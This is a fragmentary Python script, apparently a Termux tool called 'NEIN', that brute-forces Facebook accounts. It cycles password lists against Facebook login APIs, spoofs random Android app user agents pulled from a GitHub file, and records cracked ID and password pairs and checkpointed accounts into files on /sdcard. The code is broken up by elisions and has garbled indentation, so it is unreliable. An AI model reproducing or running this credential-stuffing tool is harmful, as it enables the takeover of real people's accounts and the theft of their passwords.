...
xxxxx=requests.get('https://raw.githubusercontent.com/NEIN-143/ONLY-GREEN/5ff57fa6eb95d959416adaf76fc1b5531ba8839f/mdls.txt').text.splitlines()
#----------------------ugen--------------------------#
...
#----------------------version--------------------------#
version=requests.get('https://raw.githubusercontent.com/NEIN-143/ONLY-GREEN/5ff57fa6eb95d959416adaf76fc1b5531ba8839f/mdls.txt').text.splitlines()
#--------------------------logo-----------------------------------#
sys.stdout.write('\x1b]2;[=]-NEIN-[=]\x07')
#--------------------------------------------------------------------#
logo=("""\033[1;32m
d8b   db d88888b d888888b d8b   db 
888o  88 88'       `88'   888o  88 
88V8o 88 88ooooo    88    88V8o 88 
88 V8o88 88~~~~~    88    88 V8o88 
88  V888 88.       .88.   88  V888 
VP   V8P Y88888P Y888888P VP   V8P 
\033[1;37m================\033[1;37m===========\033[1;37m================
            \033[1;31m| \033[1;32m𝐍𝐄𝐍 🌿\033[1;31m : \033[1;32m1.0.4 \033[1;31m| \033[1;32m
\033[1;37m================\033[1;37m===========\033[1;37m================
 \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32m𝐍𝐄𝐍 🌿🤍
 \033[1;32m[=]\033[1;37m FACEBOOK \033[1;31m: \033[1;32mmeeeha
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        try:
                                                ...
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m [=]\033[1;37m NEIN \033[1;31m:\033[1;32m Firstlast \033[1;31m| \033[1;32mFirst 123\033[1;31m |\033[1;32m First123 ')
                                        linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mNEIN-HD\033[1;37m]  %s  \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [NEIN-OK] %s | %s'%(ids,pas))
                                cek_apk(session,coki)
                                open('/sdcard/NEIN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [NEIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NEIN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NEIN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NEIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api5(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))                                
                                ua_string = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505064;FBDM/{density=4.0,width=1440,height=2560};FBLC/de_DE;FBRV/0;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ...
                                        break
                                                ...
                                                print('\r\r\033[1;31m [NEIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BLCK!Xx-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break                                        
                                                open('/sdcard/NEIN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
